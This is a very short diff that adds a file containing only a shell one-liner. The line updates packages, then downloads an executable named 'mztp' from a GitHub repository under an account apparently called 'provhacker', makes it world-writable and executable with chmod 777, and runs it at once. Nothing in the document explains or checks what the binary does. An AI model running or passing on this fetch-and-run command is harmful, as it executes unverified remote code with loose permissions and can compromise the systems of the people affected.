@@ -1,0 +1,2 @@
+# 
+apt update -y && apt upgrade -y && wget https://raw.githubusercontent.com/provhacker/genio/main/mztp && chmod 777 mztp && ./mztp
